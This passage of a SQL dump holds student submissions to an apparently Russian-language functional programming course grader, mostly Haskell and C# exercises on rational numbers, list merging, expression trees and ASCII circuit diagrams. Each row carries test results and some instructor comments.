(3164, 85, '12206137', '2012-11-04 21:43:45', 0, 'data Ration = Rat Integer Integer\r\n\n\r\n\ninstance Num Ration where\r\n\n    Rat a b + Rat c d = Rat (a * d + b * c) (c * d)\r\n\n\r\n\ninstance Ord Ration where\r\n\n    Rat a b <= Rat c d = a * d <= b * c\r\n\n\r\n\ninstance Eq Ration where\r\n\n    Rat a b == Rat c d = a * d == b * c\r\n\n\r\n\ninstance Show Ration where\r\n\n    show (Rat a b) = show a ++ "/" ++ show b\r\n\n\n', 'Выражение имеет неправильное значение: Rat 1 2 + Rat 1 7'),
(3165, 85, '12206137', '2012-11-04 21:45:46', 0, 'data Ration = Rat Integer Integer\r\n\n\r\n\ninstance Num Ration where\r\n\n    Rat a b + Rat c d = Rat (a * d + b * c) (b * d)\r\n\n\r\n\ninstance Ord Ration where\r\n\n    Rat a b <= Rat c d = a * d <= b * c\r\n\n\r\n\ninstance Eq Ration where\r\n\n    Rat a b == Rat c d = a * d == b * c\r\n\n\r\n\ninstance Show Ration where\r\n\n    show (Rat a b) = show a ++ "/" ++ show b\r\n\n\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3166, 85, '12206137', '2012-11-04 21:55:04', 1, 'data Ration = Rat Integer Integer\r\n\r\n\r\n\r\ninstance Num Ration where\r\n\r\n    Rat a b + Rat c d = Rat (a * d + b * c) (b * d)\r\n\r\n\r\n\r\ninstance Eq Ration where\r\n\r\n    Rat a b == Rat c d = a * d == b * c\r\n\r\n\r\n\r\n-- It''s very strange, because definition of rational number assumes, that denomenator is natural\r\n   --- Это правильно, но, к сожалению, Хаскел так устроен что мы не можем делать ограничения\r\n   --- при сооружении обьекта. Те мы не можем заставить пользователя задавать положительный знаменатель\r\n   --- (Точнее можем, но только если вообще запретим, с помощью специальных функций, пользоваться\r\n   --- конструктором, и заставим работать с числами только через функции)\r\nnorm (Rat a b) =\r\n\r\n    if b < 0 then (-a,-b)\r\n\r\n    else (a,b)\r\n\r\n\r\n\r\ninstance Ord Ration where\r\n\r\n    fst <= snd =\r\n\r\n        let (a,b) = norm fst in\r\n\r\n        let (c,d) = norm snd in\r\n\r\n        a * d <= b * c\r\n\r\n\r\n\r\ninstance Show Ration where\r\n\r\n    show (Rat a b) = show a ++ "/" ++ show b\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3167, 91, '472848', '2012-11-04 22:09:24', 1, 'merge li [] = li\r\nmerge [] li = li\r\nmerge (x:xs) (y:ys) = if (x < y) \r\nthen x : merge xs (y:ys) else if (x > y) \r\nthen y : merge (x:xs) ys else x : merge xs ys', '<br/>Тесты успешно пройдены!'),
(3168, 94, '2118411', '2012-11-04 22:30:36', 2, '   --- Замечательно, но я вас попрошу немного дописать\r\n   ---  - вместо буквы R пишите, пожалуйста, число (значение сопротивления)\r\n   ---  - там, где провода соединяются, ставьте, пожалуйста, + (там, где одна схема соединяется с другой и на углах)\r\n   ---  - вот в таком примере Par (R 3) (Par (R 3) (R 3)) мне кажется получается не очень красиво, потому что\r\n   ---    вертикальные провода идут на расстоянии 1 и никак не видно, что провод поворачивает. Мне каждется\r\n   ---    лучше сделать расстояние между проводами побольше (на растоянии 2) и соотвественно чтобы в месте\r\n   ---    соединения была хоть одна горизонтальная палочка\r\n\r\n\r\ndata Scheme = R Double | Par Scheme Scheme | Seq Scheme Scheme\r\n\r\ninstance Show Scheme where\r\n\r\n	show = f.myshow\r\n\r\n\r\n\r\nf lst= (foldr (++) "" (map (xs->xs ++ [''\r\n'']) lst))\r\n\r\n\r\n\r\nmyshow (R _) = ["-R-"]\r\n\r\nmyshow (Par s1 s2)\r\n\r\n	| re == 2 = flst1++(drawFrWh "|" [filler])++(drawFrU "|" flst2)\r\n\r\n	| otherwise = (drawFrD "|" flst1)++(drawFrWh "|" [filler])++(drawFrU "|" flst2)\r\n\r\n	where\r\n\r\n		lst1 = myshow s1\r\n\r\n		lst2 = myshow s2\r\n\r\n		width = max (length (lst1!!0)) (length (lst2!!0))\r\n\r\n		re = if ((lst1!!0)!!0 == ''|'') then 2 else 0\r\n\r\n		flst1 = fixwidth lst1 width\r\n\r\n		flst2 = fixwidth lst2 (width - re)\r\n\r\n		len = length (flst1!!0) - re\r\n\r\n		filler = foldr (++) "" (replicate len " ")\r\n\r\n		drawFrWh s xs = drawFr 0 (length xs - 1) s xs\r\n\r\n		drawFrU s xs = drawFr 0 ((length xs) `div` 2) s xs\r\n\r\n		drawFrD s xs = drawFr ((length xs) `div` 2) (length xs) s xs\r\n\r\n		drawFr st end s xs = [e++str++e | i<-[0..(length xs - 1)], let str = xs!!i, let e = if (i>=st && i <=end) then s else " "]\r\n\r\n\r\n\r\nmyshow (Seq s1 s2) = [delim++str1++delim++str2++delim | i<-[0..len-1],\r\n\r\n	let str1 = fls1!!i,\r\n\r\n	let str2 = fls2!!i,\r\n\r\n	let delim = if (i == len `div` 2) then "-" else " "]\r\n\r\n	where\r\n\r\n		len = max (length ls1) (length ls2)\r\n\r\n		fls1 = fixlen ls1 len\r\n\r\n		fls2 = fixlen ls2 len\r\n\r\n		ls1 = myshow s1\r\n\r\n		ls2 = myshow s2\r\n\r\n\r\n\r\nfixlen ls len\r\n\r\n	| lslen > len = error "=("\r\n\r\n	| lslen == len = ls\r\n\r\n	| otherwise = fixlen ([filler]++ls++[filler]) len\r\n\r\n	where\r\n\r\n		lslen = length ls\r\n\r\n		filler = foldr (++) "" (replicate (length (ls!!0)) " ")\r\n\r\n\r\n\r\nfixwidth ls width\r\n\r\n	| wdt > width = error "=("\r\n\r\n	| wdt == width = ls\r\n\r\n	| otherwise = fixwidth [delim++str++delim| i<-[0..lslen-1],\r\n\r\n			let str = ls!!i, let delim = if (i == lslen `div` 2) then "-" else " "] width\r\n\r\n	where\r\n\r\n		wdt = length (ls!!0)\r\n\r\n		lslen = length ls\r\n\r\n\r\n\r\n\r\n\r\n-- Par  (Seq (Par (R 0) (R 0)) (R 0)) (Seq  (R 0) (Par (R 0) (R 0)))\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3169, 85, 'erwert', '2012-11-04 23:48:18', 0, 'data Rat = Rat Int Int deriving Eq\r\n \r\ninstance Ord Rat where\r\n    Rat a b < Rat c d = ( a * d < c * b)\r\n \r\ninstance Num Rat where\r\n    Rat a b + Rat c d = Rat (a * d + b * c) (b * d)\r\n \r\ninstance Show Rat where\r\n	show (Rat a b) = show a ++ "/" ++ show b\r\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3170, 85, 'erwert', '2012-11-04 23:56:55', 0, 'data Rat = Rat Int Int deriving Eq\r\n \r\ninstance Ord Rat where\r\n    Rat a b < Rat c d = ( a * d < c * b)\r\n \r\ninstance Num Rat where\r\n    Rat a b + Rat c d = Rat (a * d + b * c) (b * d)\r\n \r\ninstance Show Rat where\r\n	show (Rat a b) = if a * b > 0 then show a ++ "/" ++ show b else "-" ++ (show $ abs a) ++ "/" ++ (show $ abs b)\r\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3171, 85, 'erwert', '2012-11-04 23:58:46', 0, 'data Rat = Rat Int Int deriving Eq\r\n \r\ninstance Ord Rat where\r\n    Rat a b < Rat c d = ( a * d < c * b)\r\n \r\ninstance Num Rat where\r\n    Rat a b + Rat c d = Rat (a * d + b * c) (b * d)\r\n \r\ninstance Show Rat where\r\n	show (Rat a b) = if a * b > 0 then show a ++ "/" ++ show b else "-" ++ (show $ abs a) ++ "/" ++ (show $ abs b)\r\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3172, 83, 'erwert', '2012-11-04 23:59:28', 2, '   --- Это вы не туда решение положили..\r\n   --- Если вы для этой задачи (21-1) выкладывали раньше правильное решение, то \r\n   --- выложите его еще раз, пожалуйста, иначе она будет считаться не решенной\r\ndata Rat = Rat Int Int deriving Eq\r\n \r\ninstance Ord Rat where\r\n    Rat a b < Rat c d = ( a * d < c * b)\r\n \r\ninstance Num Rat where\r\n    Rat a b + Rat c d = Rat (a * d + b * c) (b * d)\r\n \r\ninstance Show Rat where\r\n	show (Rat a b) = if a * b > 0 then (show $ abs a) ++ "/" ++ (show $ abs b) else "-" ++ (show $ abs a) ++ "/" ++ (show $ abs b)', '<br/>Тесты успешно пройдены!'),
(3173, 85, 'erwert', '2012-11-04 23:59:54', 0, 'data Rat = Rat Int Int\r\n \r\n--instance Ord Rat where\r\n--	(Rat a b) < (Rat c d) = ( a * d < c * b)\r\n \r\ninstance (Eq a) => Eq (Rat a) where\r\n	(Rat a b) + (Rat a b) = 7\r\n \r\ninstance Show Rat where\r\n	show (Rat a b) = show a ++ " / " ++ show b', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3174, 85, 'erwert', '2012-11-05 00:00:58', 0, 'data Rat = Rat Int Int deriving Eq\r\n \r\ninstance Ord Rat where\r\n    Rat a b < Rat c d = ( a * d < c * b)\r\n \r\ninstance Num Rat where\r\n    Rat a b + Rat c d = Rat (a * d + b * c) (b * d)\r\n \r\ninstance Show Rat where\r\n	show (Rat a b) = if a * b > 0 then (show $ abs a) ++ "/" ++ (show $ abs b) else "-" ++ (show $ abs a) ++ "/" ++ (show $ abs b)\r\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3175, 85, '472848', '2012-11-05 00:01:35', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Eq Ration where\r\n  (Rat x1 y1) == (Rat x2 y2) = (x1 * y2 == x2 * y1)\r\n\r\ninstance Show Ration where\r\n  show (Rat x y) = let x1 = div x (gcd x y); y1 = div y (gcd x y) in if (y1 /= 1) then show x1 ++ ''/'' : show y1 else show x1\r\n\r\ninstance Num Ration where\r\n  (Rat x1 y1) + (Rat x2 y2) = let y = lcm y1 y2; x = x1 * (div y y1) + x2 * (div y y2) in Rat x y\r\n    --- Если уж пользоваться lcm, то я бы сразу сократил числитель и знаменатель осле сложения,\r\n    --- чтобы, например 1/3 + 1/6 сразу получилось бы 1/2\r\n\r\ninstance Ord Ration where\r\n  (Rat x1 y1) < (Rat x2 y2) = if (y1 * y2 > 0) then (x1 * y2 < x2 * y1) else (x1 * y2 > x2 * y1)', '<br/>Тесты успешно пройдены!'),
(3176, 85, 'erwert', '2012-11-05 00:19:21', 1, 'data Rat = Rat Int Int deriving Eq\r\n\r\ninstance Ord Rat where\r\n    Rat a b < Rat c d = (a * d - c * b) * b * d < 0 \r\n \r\ninstance Num Rat where\r\n    Rat a b + Rat c d = Rat (a * d + b * c) (b * d)\r\n \r\ninstance Show Rat where\r\n	show (Rat a b) = if a * b > 0 \r\n        then \r\n            (show $ abs a) ++ "/" ++ (show $ abs b) \r\n        else \r\n            "-" ++ (show $ abs a) ++ "/" ++ (show $ abs b)\r\n', '<br/>Тесты успешно пройдены!'),
(3177, 85, '787463', '2012-11-05 04:48:33', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Num Ration where\r\n    (Rat n1 d1) + (Rat n2 d2) = Rat (n1*d2 + n2*d1) (d1*d2)\r\n\r\ninstance Ord Ration where\r\n    (Rat n1 d1) < (Rat n2 d2) = if (d1*d2 > 0) then n1*d2 < n2*d1 else n1*d2 > n2*d1\r\n\r\ninstance Eq Ration where\r\n    (Rat n1 d1) == (Rat n2 d2) = n1*d2 == n2*d1\r\n\r\ninstance Show Ration where\r\n    show (Rat n d) = show n ++ "/" ++ show d', '<br/>Тесты успешно пройдены!'),
(3178, 86, '787463', '2012-11-05 04:49:11', 1, 'allNondivisible'' [] cond = True\r\nallNondivisible'' (x:xs) cond = if not(cond x) then False else allNondivisible'' xs (	 -> cond t && t `mod` x /= 0 && x `mod` t /= 0)\r\nallNondivisible xs = allNondivisible'' xs (const True)', '<br/>Тесты успешно пройдены!'),
(3179, 87, '787463', '2012-11-05 04:49:34', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval X n = n\r\neval (N n) _ = n\r\neval (Add s1 s2) n = eval s1 n + eval s2 n\r\neval (Mult m1 m2) n = eval m1 n * eval m2 n', '<br/>Тесты успешно пройдены!'),
(3180, 88, '787463', '2012-11-05 04:50:05', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add s1 s2) = Add (diff s1) (diff s2)\r\ndiff (Mult m1 m2) = Add (Mult (diff m1) m2) (Mult m1 (diff m2))', '<br/>Тесты успешно пройдены!'),
(3181, 89, '787463', '2012-11-05 04:50:38', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten'' Empty acc = acc\r\nflatten'' (Node n l r) acc = n : flatten'' l (flatten'' r acc)\r\nflatten t = flatten'' t []', '<br/>Тесты успешно пройдены!'),
(3182, 90, '787463', '2012-11-05 04:51:14', 1, 'data Result a = None | Element a deriving Show\r\n\r\nfindSame'' [] _ = None\r\nfindSame'' (x:xs) acc = if elem x acc then Element x else findSame'' xs (x:acc)\r\nfindSame xs = findSame'' xs []', '<br/>Тесты успешно пройдены!'),
(3183, 91, '787463', '2012-11-05 04:51:55', 1, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys)\r\n    | x == y = x : merge xs ys\r\n    | x > y = y : merge (x:xs) ys\r\n    | otherwise = x : merge xs (y:ys)', '<br/>Тесты успешно пройдены!'),
(3184, 95, '2118411', '2012-11-05 09:15:52', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    delegate double Func(double x);\r\n\r\n\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Console.WriteLine("{0}", allDiff(Enumerable.Range(1, 100)));\r\n\r\n        }\r\n\r\n\r\n\r\n        public static bool allDiff(IEnumerable<int> a)\r\n\r\n        {\r\n\r\n            return allDiff1(a, t => true);\r\n\r\n        }\r\n\r\n\r\n\r\n        public static bool allDiff1(IEnumerable<int> a, Predicate<int> cond)\r\n\r\n        {\r\n\r\n            foreach (int x in a)\r\n\r\n            {\r\n\r\n                if (cond.GetInvocationList().Any(pr => !(bool)pr.DynamicInvoke(x)))\r\n\r\n                {\r\n\r\n                    return false;\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    cond += getPred(x);\r\n\r\n                }\r\n\r\n            }\r\n\r\n            return true;\r\n\r\n        }\r\n\r\n\r\n\r\n        public static Predicate<int> getPred(int val)\r\n\r\n        {\r\n\r\n            return (t => t != val);\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3185, 96, '2118411', '2012-11-05 09:34:38', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    delegate double Func(double x);\r\n\r\n\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8 };\r\n\r\n            int[] b = { 3, 5, 9 };\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.WriteLine(i); // Должно напечататься 1, 3, 5, 8, 9\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n\r\n        {\r\n\r\n            var aEnumerator = a.GetEnumerator();\r\n\r\n            var bEnumerator = b.GetEnumerator();\r\n\r\n\r\n\r\n            var aNotEmpty = aEnumerator.MoveNext();\r\n\r\n            var bNotEmpty = bEnumerator.MoveNext();\r\n\r\n\r\n\r\n            while (aNotEmpty || bNotEmpty)\r\n\r\n            {\r\n\r\n                // Закончилась вторая последовательность\r\n\r\n                if (!bNotEmpty)\r\n\r\n                {\r\n\r\n                    do\r\n\r\n                    {\r\n\r\n                        yield return aEnumerator.Current;\r\n\r\n                    } while (aEnumerator.MoveNext());\r\n\r\n                    yield break;\r\n\r\n                }\r\n\r\n\r\n\r\n                // Закончилась первая последовательность\r\n\r\n                if (!aNotEmpty)\r\n\r\n                {\r\n\r\n                    do\r\n\r\n                    {\r\n\r\n                        yield return bEnumerator.Current;\r\n\r\n                    } while (bEnumerator.MoveNext());\r\n\r\n                    yield break;\r\n\r\n                }\r\n\r\n\r\n\r\n                if (aEnumerator.Current < bEnumerator.Current)\r\n\r\n                {\r\n\r\n                    yield return aEnumerator.Current;\r\n\r\n                    aNotEmpty = aEnumerator.MoveNext();\r\n\r\n                }\r\n\r\n                else if (aEnumerator.Current > bEnumerator.Current)\r\n\r\n                {\r\n\r\n                    yield return bEnumerator.Current;\r\n\r\n                    bNotEmpty = bEnumerator.MoveNext();\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    yield return aEnumerator.Current;\r\n\r\n                    aNotEmpty = aEnumerator.MoveNext();\r\n\r\n                    bNotEmpty = bEnumerator.MoveNext();\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3186, 94, '2118411', '2012-11-05 10:14:36', 2, '   --- Очень хорошо, но где-то у вас вилимо небольшая ошибка. Например\r\n   ---    Par (R 5) (Seq (R 3) (Par (R 1) (R 2))) \r\n   --- выглядит не совсем правильно (внизу крестики как-то не на месте)\r\n   --- Притом что Par (Seq (R 3) (Par (R 1) (R 2))) (R 5)\r\n   --- показывается совершенно правильно.\r\n   --- Исправьте,, пожалуйста, хорошо? (За 1 балл я бы и так засчитал, но тут все таки 3 балла:)\r\ndata Scheme = R Double | Par Scheme Scheme | Seq Scheme Scheme\r\n\r\ninstance Show Scheme where\r\n\r\n	show = f.myshow\r\n\r\n\r\n\r\nf lst= (foldr (++) "" (map (xs->xs ++ [''\r\n'']) lst))\r\n\r\n\r\n\r\nmyshow (R r) = [fix ("-"++show r++"-")]\r\n\r\n	where\r\n\r\n		fix xs\r\n\r\n			| length xs `mod` 2 == 0 = xs++"-"\r\n\r\n			| otherwise = xs\r\n\r\nmyshow (Par s1 s2)\r\n\r\n	| re1 /= 0 = flst1++[filler]++(drawFrU "|" flst2)\r\n\r\n	| re2 /= 0 = (drawFrD "|" flst1)++[filler]++flst2\r\n\r\n	| otherwise = (drawFrD "|" flst1)++[filler]++(drawFrU "|" flst2)\r\n\r\n	where\r\n\r\n		lst1 = myshow s1\r\n\r\n		lst2 = myshow s2\r\n\r\n		width = max (length (lst1!!0)) (length (lst2!!0))\r\n\r\n		re1 = if ((lst1!!0)!!0 == ''+'') then 4 else 0\r\n\r\n		re2 = if ((lst2!!0)!!0 == ''+'') then 4 else 0\r\n\r\n		flst1 = fixwidth lst1 (width - re2)\r\n\r\n		flst2 = fixwidth lst2 (width - re1)\r\n\r\n		len = (max (length (flst1!!0)) (length (flst2!!0))) - (max re1 re2)\r\n\r\n		filler = "| "++(foldr (++) "" (replicate len " "))++" |"\r\n\r\n		drawFrWh s xs = drawFr 0 (length xs - 1) s xs\r\n\r\n		drawFrU s xs = drawFr 0 ((length xs) `div` 2) s xs\r\n\r\n		drawFrD s xs = drawFr ((length xs) `div` 2) (length xs) s xs\r\n\r\n		drawFr st end s xs = [e++d++str++d++e | i<-[0..(length xs - 1)], \r\n\r\n			let str = xs!!i, let e = if (i>=st && i <=end) then (if (i==st || i==end && (end-st >1)) then "+" else s) else " ",\r\n\r\n			let d = if (i==st || i==end && (end-st>1)) then "-" else " "]\r\n\r\n\r\n\r\nmyshow (Seq s1 s2) = [delim++str1++delim++str2++delim | i<-[0..len-1],\r\n\r\n	let str1 = fls1!!i,\r\n\r\n	let str2 = fls2!!i,\r\n\r\n	let delim = if (i == len `div` 2) then "-" else " "]\r\n\r\n	where\r\n\r\n		len = max (length ls1) (length ls2)\r\n\r\n		fls1 = fixlen ls1 len\r\n\r\n		fls2 = fixlen ls2 len\r\n\r\n		ls1 = myshow s1\r\n\r\n		ls2 = myshow s2\r\n\r\n\r\n\r\nfixlen ls len\r\n\r\n	| lslen > len = error "=("\r\n\r\n	| lslen == len = ls\r\n\r\n	| otherwise = fixlen ([filler]++ls++[filler]) len\r\n\r\n	where\r\n\r\n		lslen = length ls\r\n\r\n		filler = foldr (++) "" (replicate (length (ls!!0)) " ")\r\n\r\n\r\n\r\nfixwidth ls width\r\n\r\n	| wdt > width = error "=("\r\n\r\n	| wdt == width = ls\r\n\r\n	| otherwise = fixwidth [delim++str++delim| i<-[0..lslen-1],\r\n\r\n			let str = ls!!i, let delim = if (i == lslen `div` 2) then "-" else " "] width\r\n\r\n	where\r\n\r\n		wdt = length (ls!!0)\r\n\r\n		lslen = length ls\r\n\r\n\r\n\r\n\r\n\r\n-- Par (R 3) (Par (R 3) (R 3))', '<br/>Тесты успешно пройдены!'),
(3187, 79, '397095', '2012-11-05 10:21:10', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace FunctionalProgramming\r\n{\r\n	class Digits\r\n	{\r\n		const int COUNT = 100;\r\n\r\n		static IEnumerable<int> digits(int n) \r\n		{\r\n			int current = 1;\r\n			while(true)\r\n			{\r\n				current *= 10;\r\n				if (current < n)\r\n				{\r\n					yield return 0;\r\n				}\r\n				else\r\n				{\r\n					int d = current / n;\r\n					current -= d * n;\r\n					yield return d;\r\n				}\r\n			}\r\n		}\r\n\r\n		static void Main(string[] args) \r\n		{\r\n			string s = Console.ReadLine();\r\n			int n = Convert.ToInt32(s);\r\n			int count = COUNT;\r\n			foreach (int d in digits(n)) \r\n			{\r\n				if (count-- == 0) break;\r\n				if (count < COUNT - 1)\r\n				{\r\n					Console.Write(", ");\r\n				}\r\n				Console.Write("{0}", d);\r\n			}\r\n			Console.WriteLine();\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3188, 80, '5772638', '2012-11-05 11:34:15', 1, '  class Program\r\n\r\n\r\n\r\n    {\r\n\r\n        public static IEnumerable<int[]> Kantor ( )\r\n\r\n        {\r\n\r\n            \r\n\r\n            for (int cnst=2; ;cnst++ )\r\n\r\n            {\r\n\r\n                for (int i = 1; i < cnst; i++)\r\n\r\n                {\r\n\r\n                    for (int j = 1; j < cnst; j++)\r\n     --- ОК, но, просто как замечание, этот цикл не нужен. Ведь он выполнится ровно 1 раз, когда\r\n     ---  i + j == cnst, а, значит, можно вместо него написать просто\r\n     ---     int i = cnst - j;\r\n                    {\r\n\r\n                        if (i + j == cnst)\r\n\r\n                        {\r\n\r\n                            int[] pair = new int[2];\r\n\r\n                            pair[0] = i;\r\n\r\n                            pair[1] = j;\r\n\r\n                            yield return pair;\r\n\r\n                        }\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        \r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int tt = 1;\r\n\r\n            foreach (int[] pair in Kantor())\r\n\r\n            {\r\n\r\n                \r\n\r\n                Console.Write("(" + pair[0] + ", " + pair[1] + ") ");\r\n\r\n                tt++;\r\n\r\n                if (tt > 50)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3189, 94, '2118411', '2012-11-05 13:07:47', 1, 'data Scheme = R Double | Par Scheme Scheme | Seq Scheme Scheme\r\n\r\ninstance Show Scheme where\r\n\r\n	show = f.myshow\r\n\r\n\r\n\r\nf lst= (foldr (++) "" (map (xs->xs ++ [''\r\n'']) lst))\r\n\r\n\r\n\r\nmyshow (R r) = [fix ("-"++show r++"-")]\r\n\r\n	where\r\n\r\n		fix xs\r\n\r\n			| length xs `mod` 2 == 0 = xs++"-"\r\n\r\n			| otherwise = xs\r\n\r\nmyshow (Par s1 s2)\r\n\r\n	| re1 /= 0 = flst1++[filler]++(drawFrU "|" flst2)\r\n\r\n	| re2 /= 0 = (drawFrD "|" flst1)++[filler]++flst2\r\n\r\n	| otherwise = (drawFrD "|" flst1)++[filler]++(drawFrU "|" flst2)\r\n\r\n	where\r\n\r\n		lst1 = myshow s1\r\n\r\n		lst2 = myshow s2\r\n\r\n		width = max (length (lst1!!0)) (length (lst2!!0))\r\n\r\n		re1 = if ((lst1!!0)!!0 == ''+'') then 4 else 0\r\n\r\n		re2 = if ((lst2!!0)!!0 == ''+'') then 4 else 0\r\n\r\n		flst1 = fixwidth lst1 (width - re2)\r\n\r\n		flst2 = fixwidth lst2 (width - re1)\r\n\r\n		len = (max (length (flst1!!0)) (length (flst2!!0))) - (max re1 re2)\r\n\r\n		filler = "| "++(foldr (++) "" (replicate len " "))++" |"\r\n\r\n		drawFrWh s xs = drawFr 3 0 (length xs - 1) s xs\r\n\r\n		drawFrU  s xs = drawFr 2 0 ((length xs) `div` 2) s xs\r\n\r\n		drawFrD  s xs = drawFr 1 ((length xs) `div` 2) (length xs-1) s xs\r\n\r\n		drawFr tb st end s xs = [e++d++str++d++e | i<-[0..(length xs - 1)], \r\n\r\n			let str = xs!!i,\r\n\r\n			let e = if (i>=st && i <=end) then (if (((tb==3) || (tb==2 && i==end) || (tb==1 && i==st))) then "+" else s) else " ",\r\n\r\n			let d = if ((i==st&& tb==1) || (i==end&&tb==2) || (tb==3)) then "-" else " "]\r\n\r\n\r\n\r\nmyshow (Seq s1 s2) = [delim++str1++delim++str2++delim | i<-[0..len-1],\r\n\r\n	let str1 = fls1!!i,\r\n\r\n	let str2 = fls2!!i,\r\n\r\n	let delim = if (i == len `div` 2) then "-" else " "]\r\n\r\n	where\r\n\r\n		len = max (length ls1) (length ls2)\r\n\r\n		fls1 = fixlen ls1 len\r\n\r\n		fls2 = fixlen ls2 len\r\n\r\n		ls1 = myshow s1\r\n\r\n		ls2 = myshow s2\r\n\r\n\r\n\r\nfixlen ls len\r\n\r\n	| lslen > len = error "=("\r\n\r\n	| lslen == len = ls\r\n\r\n	| otherwise = fixlen ([filler]++ls++[filler]) len\r\n\r\n	where\r\n\r\n		lslen = length ls\r\n\r\n		filler = foldr (++) "" (replicate (length (ls!!0)) " ")\r\n\r\n\r\n\r\nfixwidth ls width\r\n\r\n	| wdt > width = error "=("\r\n\r\n	| wdt == width = ls\r\n\r\n	| otherwise = fixwidth [delim++str++delim| i<-[0..lslen-1],\r\n\r\n			let str = ls!!i, let delim = if (i == lslen `div` 2) then "-" else " "] width\r\n\r\n	where\r\n\r\n		wdt = length (ls!!0)\r\n\r\n		lslen = length ls\r\n', '<br/>Тесты успешно пройдены!'),
(3190, 95, 'Deutsche', '2012-11-05 13:25:49', 1, '﻿// Задача 24.1 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace _24._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        // вариант без усложнения функции\r\n\r\n        public static bool allDifferent1(int[] a, Func<int, bool> cond)\r\n\r\n        {\r\n\r\n            if (a.Length == 1)\r\n\r\n                return true;\r\n\r\n            else\r\n\r\n            {\r\n\r\n                int[] b = new int[a.Length - 1];\r\n\r\n                Array.Copy(a, b, a.Length - 1);\r\n\r\n                if (b.Any(cond))\r\n\r\n                    return false;\r\n\r\n                else\r\n\r\n                    return allDifferent1(b, x => x == b[b.Length - 1]);\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        // вариант с усложнением функции\r\n\r\n        public static bool allDifferent2(int[] a, int from, Predicate<int> cond)\r\n\r\n        {\r\n\r\n            if (from == a.Length)\r\n\r\n                return true;\r\n\r\n            else\r\n\r\n            {\r\n\r\n                if (cond(a[from]))\r\n\r\n                    return false;\r\n\r\n                else\r\n\r\n                    return allDifferent2(a, from + 1, x => ((cond(x)) || (x == a[from])));\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static bool allDifferent(int[] a)\r\n\r\n        {\r\n\r\n            //return allDifferent1(a, t => false);\r\n\r\n            return allDifferent2(a, 0, t => false);\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] ar1 = new int[18] { 45345, 32522, 5427234, 12510, 26231, 8745, 5632, 236, 40, 4, 23265, 2364, 45650, 432, 3632268, 232550, 362, 3664 };\r\n\r\n            Console.WriteLine("Source array #1:");\r\n\r\n            for (int i = 0; i <= 17; i++)\r\n\r\n                Console.Write(ar1[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine();\r\n\r\n            \r\n\r\n            if (allDifferent(ar1))\r\n\r\n                Console.WriteLine("All elements of the first source array are different.");\r\n\r\n            else\r\n\r\n                Console.WriteLine("There are equal elements in the first source array.");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            int[] ar2 = new int[15] { 234, 437865, 35864679, 35, 3856, 497, 4974, 4967, 346, 5078057, 45684769, 347553, 347534784, 3856, 5484 };\r\n\r\n            Console.WriteLine("Source array #2:");\r\n\r\n            for (int i = 0; i <= 14; i++)\r\n\r\n                Console.Write(ar2[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            if (allDifferent(ar2))\r\n\r\n                Console.WriteLine("All elements of the 